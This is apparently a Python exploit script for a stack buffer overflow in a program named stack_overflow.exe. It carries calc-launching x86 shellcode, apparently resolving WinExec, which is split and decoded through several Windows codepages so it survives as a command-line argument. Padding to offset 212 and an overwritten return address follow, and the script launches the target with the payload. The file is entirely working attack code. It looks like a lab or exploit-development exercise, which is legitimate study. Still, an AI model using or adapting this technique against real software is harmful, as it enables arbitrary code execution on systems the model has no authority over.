import subprocess

"""
# **** ORIGINAL SHELLCODE **** #
shellcode = \
"\x31\xC0\x50\x68\x63\x61\x6C\x63\x54\x59\x50\x40\x92\x74" \
"\x15\x51\x64\x8B\x72\x2F\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B" \
"\x30\x8B\x7E\x18\xB2\x50\xEB\x1A\xB2\x60\x48\x29\xD4\x65" \
"\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48" \
"\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B" \
"\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17" \
"\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B" \
"\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF" \
"\xD7"
"""

# We have broken up shellcode in chunks so that we can decode it as string correctly.
# This correctly decoded string is necessary to run our exploit correctly.

shellcode = b'\x31\xC0\x50\x68\x63\x61\x6C\x63\x54\x59\x50\x40\x92'.decode('windows-1252')
shellcode += b'\x74\x15\x51\x64\x8B\x72\x2F\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18'.decode('windows-1250')
shellcode += '\xB2\x50\xEB\x1A\xB2'
shellcode += b'\x60\x48\x29\xD4\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01'.decode('windows-1250')
shellcode += '\xFE'
shellcode += b'\x8B\x54\x1F\x24\x0F\xB7\x2C\x17'.decode('windows-1250')
shellcode += '\x8D'
shellcode += b'\x52\x02\xAD'.decode('windows-1250')
shellcode += b'\x81'.decode('latin-1')
shellcode += b'\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01'.decode('windows-1252')
shellcode += b'\xfe\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7'.decode('windows-1252')

ESP = '\x58\xfe\x5f'

payload = shellcode
payload += 'A'*(212 -4 -len(shellcode))
payload += 'B'*4
payload += ESP

subprocess.Popen(["stack_overflow.exe ", payload])

